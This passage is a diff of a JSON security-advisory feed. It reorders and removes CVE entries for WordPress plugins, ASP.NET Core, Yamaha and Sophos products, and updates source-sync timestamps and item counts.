-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00613,
-      "epss_percentile": 0.49406,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-112827",
-      "title": "Missing Authorization vulnerability in VillaTheme HANDMADE – Dropshipping for Etsy and WooCommerce handmade-dropshipping-for-etsy-and-woo allows Exploiting Incorrectly Configu",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "Missing Authorization vulnerability in VillaTheme HANDMADE – Dropshipping for Etsy and WooCommerce handmade-dropshipping-for-etsy-and-woo allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects HANDMADE – Dropshipping for Etsy and WooCommerce: from n/a through 1.0.10.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112827"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "7.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T11:54:57Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00238,
-      "epss_percentile": 0.14976,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-114193",
-      "title": "Missing Authorization vulnerability in Eyal Fitoussi GEO my WordPress geo-my-wp allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects GEO ",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "Missing Authorization vulnerability in Eyal Fitoussi GEO my WordPress geo-my-wp allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects GEO my WordPress: from n/a through 4.5.5.5.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114193"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "7.5",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T11:54:57Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00317,
-      "epss_percentile": 0.24736,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-115611",
-      "title": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in PluginUs.Net TableOn posts-table-filterable allows Reflected XSS.This iss",
-      "severity": "high",
-      "categories": [
-        ".NET / ASP.NET"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in PluginUs.Net TableOn posts-table-filterable allows Reflected XSS.This issue affects TableOn: from n/a through 1.0.7.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115611"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "7.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T11:54:57Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.0019,
-      "epss_percentile": 0.08722,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-116409",
-      "title": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Swings Upsell Order Bump Offer for WooCommerce upsell-order-bump-offer",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Swings Upsell Order Bump Offer for WooCommerce upsell-order-bump-offer-for-woocommerce allows Reflected XSS.This issue affects Upsell Order Bump Offer for WooCommerce: from n/a through 3.1.6.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116409"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "7.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T11:54:57Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.0019,
-      "epss_percentile": 0.08723,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-118989",
-      "title": "WebToffee Product Import Export for WooCommerce 2.5.1 before 2.6.8 contains a server-side request forgery vulnerability in download_remote_file that allows shop_manager users ",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "WebToffee Product Import Export for WooCommerce 2.5.1 before 2.6.8 contains a server-side request forgery vulnerability in download_remote_file that allows shop_manager users to reach internal services via redirects. Attackers can submit a .csv URL that returns an HTTP 302 redirect to an internal address, causing the server to fetch internal responses and return them as import data.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118989"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T11:54:57Z",
-      "source_updated_at": "2026-10-29T16:21:34.310",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00267,
-      "epss_percentile": 0.18924,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-103665",
-      "title": "The installer for Yamaha LAN Monitor for Windows provided by Yamaha Corporation may insecurely load Dynamic Link Libraries (DLLs)",
-      "severity": "high",
-      "categories": [
-        "Windows"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The installer for Yamaha LAN Monitor for Windows provided by Yamaha Corporation may insecurely load Dynamic Link Libraries (DLLs). When the installer is launched in a directory containing a specially crafted DLL file, the malicious DLL may be loaded, resulting in arbitrary code execution with administrative privileges.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-103665"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "8.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T13:11:16Z",
-      "source_updated_at": "2026-10-29T15:45:15.310",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00194,
-      "epss_percentile": 0.09139,
-      "epss_as_of": "2026-11-04"
-    },
-    {
       "id": "CVE-2026-105477",
       "title": "Managed Veeam Agent for Linux local privilege escalation",
       "severity": "high",
@@ -186591,6 +186696,42 @@
       "epss_as_of": "2026-11-04"
     },
     {
+      "id": "CVE-2026-88092",
+      "title": "ASP.NET Core Kestrel HTTP/1 request smuggling",
+      "severity": "critical",
+      "cvss": "9.4",
+      "categories": [
+        ".NET / ASP.NET",
+        ".NET Core"
+      ],
+      "published": "2026-10-13",
+      "updated": "2026-10-13",
+      "summary": "An aborted Kestrel HTTP/1 connection can cause unread request body data to be reparsed as a new request, allowing HTTP request smuggling or message desynchronization in affected ASP.NET Core hosts.",
+      "affected": "Microsoft.AspNetCore.App.Runtime versions 8.0.0 through 8.0.31, 9.0.0 through 9.0.20, 10.0.0 through 10.0.12 and corresponding affected .NET 11 prereleases.",
+      "remediation": "Microsoft first patched in ASP.NET Core 8.0.32, 9.0.21, 10.0.13 and .NET 11 RC2. Prefer the newer 8.0.33, 9.0.22, 10.0.14 or RC3 October 25 releases for current servicing.",
+      "exploitation": "No confirmed exploitation in the cited Microsoft advisory.",
+      "sources": [
+        {
+          "label": "Microsoft ASP.NET Core Kestrel security advisory",
+          "url": "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-rv87-ccxw-8ggf"
+        },
+        {
+          "label": "Microsoft Security Update Guide",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-88092"
+        }
+      ],
+      "kind": "cve",
+      "source_type": "vendor_baseline",
+      "source_updated_at": "2026-10-13",
+      "status": "Vendor-sourced historical baseline; not newly disclosed",
+      "first_seen_at": "2026-10-28T02:30:57Z",
+      "known_exploited": false,
+      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
+      "epss": 0.00934,
+      "epss_percentile": 0.6081,
+      "epss_as_of": "2026-11-04"
+    },
+    {
       "id": "CVE-2026-108398",
       "title": ".NET Framework untrusted search path security feature bypass",
       "severity": "high",
@@ -186629,42 +186770,6 @@
       "action": "Verify the affected version and exposure, then follow the vendor remediation.",
       "epss": 0.00779,
       "epss_percentile": 0.55938,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-88092",
-      "title": "ASP.NET Core Kestrel HTTP/1 request smuggling",
-      "severity": "critical",
-      "cvss": "9.4",
-      "categories": [
-        ".NET / ASP.NET",
-        ".NET Core"
-      ],
-      "published": "2026-10-13",
-      "updated": "2026-10-13",
-      "summary": "An aborted Kestrel HTTP/1 connection can cause unread request body data to be reparsed as a new request, allowing HTTP request smuggling or message desynchronization in affected ASP.NET Core hosts.",
-      "affected": "Microsoft.AspNetCore.App.Runtime versions 8.0.0 through 8.0.31, 9.0.0 through 9.0.20, 10.0.0 through 10.0.12 and corresponding affected .NET 11 prereleases.",
-      "remediation": "Microsoft first patched in ASP.NET Core 8.0.32, 9.0.21, 10.0.13 and .NET 11 RC2. Prefer the newer 8.0.33, 9.0.22, 10.0.14 or RC3 October 25 releases for current servicing.",
-      "exploitation": "No confirmed exploitation in the cited Microsoft advisory.",
-      "sources": [
-        {
-          "label": "Microsoft ASP.NET Core Kestrel security advisory",
-          "url": "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-rv87-ccxw-8ggf"
-        },
-        {
-          "label": "Microsoft Security Update Guide",
-          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-88092"
-        }
-      ],
-      "kind": "cve",
-      "source_type": "vendor_baseline",
-      "source_updated_at": "2026-10-13",
-      "status": "Vendor-sourced historical baseline; not newly disclosed",
-      "first_seen_at": "2026-10-28T02:30:57Z",
-      "known_exploited": false,
-      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
-      "epss": 0.00934,
-      "epss_percentile": 0.6081,
       "epss_as_of": "2026-11-04"
     },
     {
@@ -186864,37 +186969,6 @@
       "epss_as_of": "2026-11-04"
     },
     {
-      "id": "CVE-2025-6704",
-      "title": "Sophos Firewall Secure PDF eXchange preauthentication code execution",
-      "severity": "critical",
-      "cvss": null,
-      "categories": [
-        "Sophos Firewall"
-      ],
-      "published": "2025-07-21",
-      "updated": "2025-07-21",
-      "summary": "Arbitrary file writing in Sophos Firewall Secure PDF eXchange can allow remote code execution before authentication when the specified SPX configuration is combined with High Availability mode.",
-      "affected": "Sophos Firewall 21.5 GA and earlier. The exploitation prerequisites are limited to specifically configured SPX and HA deployments.",
-      "remediation": "Confirm the Sophos hotfix is applied on the supported SFOS version, or upgrade to a version containing the fix (21.0 MR2 or newer per Sophos). Confirm automatic installation of hotfixes is enabled.",
-      "exploitation": "Sophos reported no observed exploitation at the time of its July 2025 advisory.",
-      "sources": [
-        {
-          "label": "Sophos Firewall security advisory",
-          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20250721-sfos-rce"
-        }
-      ],
-      "kind": "cve",
-      "source_type": "vendor_baseline",
-      "source_updated_at": "2025-07-21",
-      "status": "Vendor-sourced historical baseline; not newly disclosed",
-      "first_seen_at": "2026-10-28T02:02:13Z",
-      "known_exploited": false,
-      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
-      "epss": 0.11772,
-      "epss_percentile": 0.96083,
-      "epss_as_of": "2026-11-04"
-    },
-    {
       "id": "CVE-2025-7624",
       "title": "Sophos Firewall legacy SMTP proxy SQL injection leading to code execution",
       "severity": "critical",
@@ -186923,6 +186997,37 @@
       "action": "Verify the affected version and exposure, then follow the vendor remediation.",
       "epss": 0.10514,
       "epss_percentile": 0.95771,
+      "epss_as_of": "2026-11-04"
+    },
+    {
+      "id": "CVE-2025-6704",
+      "title": "Sophos Firewall Secure PDF eXchange preauthentication code execution",
+      "severity": "critical",
+      "cvss": null,
+      "categories": [
+        "Sophos Firewall"
+      ],
+      "published": "2025-07-21",
+      "updated": "2025-07-21",
+      "summary": "Arbitrary file writing in Sophos Firewall Secure PDF eXchange can allow remote code execution before authentication when the specified SPX configuration is combined with High Availability mode.",
+      "affected": "Sophos Firewall 21.5 GA and earlier. The exploitation prerequisites are limited to specifically configured SPX and HA deployments.",
+      "remediation": "Confirm the Sophos hotfix is applied on the supported SFOS version, or upgrade to a version containing the fix (21.0 MR2 or newer per Sophos). Confirm automatic installation of hotfixes is enabled.",
+      "exploitation": "Sophos reported no observed exploitation at the time of its July 2025 advisory.",
+      "sources": [
+        {
+          "label": "Sophos Firewall security advisory",
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20250721-sfos-rce"
+        }
+      ],
+      "kind": "cve",
+      "source_type": "vendor_baseline",
+      "source_updated_at": "2025-07-21",
+      "status": "Vendor-sourced historical baseline; not newly disclosed",
+      "first_seen_at": "2026-10-28T02:02:13Z",
+      "known_exploited": false,
+      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
+      "epss": 0.11772,
+      "epss_percentile": 0.96083,
       "epss_as_of": "2026-11-04"
     },
     {
@@ -186970,85 +187075,85 @@
   "sources": {
     "github": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
-      "items_processed": 240,
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
+      "items_processed": 264,
       "url": "https://api.github.com/advisories"
     },
     "php_upstream": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 66,
       "url": "https://api.github.com/repos/php/php-src/security-advisories"
     },
     "nvd": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
-      "items_processed": 493,
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
+      "items_processed": 393,
       "url": "https://services.nvd.nist.gov/rest/json/cves/2.0"
     },
     "cisa_kev": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 485,
       "url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
     },
     "msrc_rss": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 2554,
       "url": "https://api.msrc.microsoft.com/update-guide/rss"
     },
     "fortinet_rss": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 15,
       "url": "https://filestore.fortinet.com/fortiguard/rss/ir.xml"
     },
     "ubuntu_rss": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 11,
       "url": "https://ubuntu.com/security/notices/rss.xml"
     },
     "debian_rss": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 47,
       "url": "https://www.debian.org/security/dsa-long"
     },
     "docker_rss": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 0,
       "url": "https://docs.docker.com/security/security-announcements/index.xml"
     },
     "kubernetes": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 94,
       "url": "https://k8s.io/docs/reference/issues-security/official-cve-feed/index.json"
     },
     "mariadb": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 13,
       "url": "https://api.github.com/repos/MariaDB/server/security-advisories"
     },
     "redhat": {
       "ok": true,
-      "last_success": "2026-11-04T06:11:20Z",
-      "last_attempt": "2026-11-04T06:11:20Z",
+      "last_success": "2026-11-04T07:30:00Z",
+      "last_attempt": "2026-11-04T07:30:00Z",
       "items_processed": 200,
       "url": "https://access.redhat.com/hydra/rest/securitydata/cve.json"
     },
@@ -187060,7 +187165,7 @@
       "url": "https://epss.empiricalsecurity.com/epss_scores-current.csv.gz"
     }
   },
-  "last_checked_at": "2026-11-04T06:11:20Z",
-  "last_successful_update": "2026-11-04T06:11:20Z",
+  "last_checked_at": "2026-11-04T07:30:00Z",
+  "last_successful_update": "2026-11-04T07:30:00Z",
   "note": "Public advisory intelligence only. Actual vulnerability exposure requires asset/version validation."
 }
